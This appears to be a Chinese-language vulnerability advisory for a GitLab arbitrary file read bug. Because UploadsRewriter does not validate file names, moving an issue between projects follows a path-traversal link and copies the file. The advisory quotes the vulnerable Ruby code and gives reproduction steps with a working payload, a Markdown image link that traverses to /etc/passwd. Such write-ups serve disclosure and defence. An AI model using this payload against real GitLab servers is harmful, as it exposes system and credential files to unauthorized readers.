# Gitlab 任意文件读取漏洞

## 一、漏洞简介

在`UploadsRewriter`不验证文件名，允许任意文件，以通过目录遍历移动的问题，以新项目时被复制。

用于查找参考的模式是：

```
  MARKDOWN_PATTERN = %r{\!?\[.*?\]\(/uploads/(?<secret>[0-9a-f]{32})/(?<file>.*?)\)}.freeze

```

这是使用的`UploadsRewriter`复制问题也跨文件复制时：

```
   @text.gsub(@pattern) do |markdown|
          file = find_file(@source_project, $~[:secret], $~[:file])
          break markdown unless file.try(:exists?)

          klass = target_parent.is_a?(Namespace) ? NamespaceFileUploader : FileUploader
          moved = klass.copy_to(file, target_parent)
...
   def find_file(project, secret, file)
        uploader = FileUploader.new(project, secret: secret)
        uploader.retrieve_from_store!(file)
        uploader
      end

```

由于没有限制`file`，因此可以使用路径遍历来复制任何文件。

## 二、漏洞影响

## 三、复现过程

1. 创建两个项目

    ![1.png](images/2c08682a913f412996555ef77f64b1d5.png)

2. 添加具有以下描述的问题：

```
![a](/uploads/11111111111111111111111111111111/../../../../../../../../../../../../../../etc/passwd)

```

1. 将问题移至第二个项目

    ![2.png](images/a7c17ee28342422f82cadad0187425f0.png)

2. 该文件将被复制到项目中

    ![3.png](images/131618f4edb74e48bc9ca264c28c7724.png)

    ![4.png](images/873208870d954e8785644d0cb266b0fd.png)

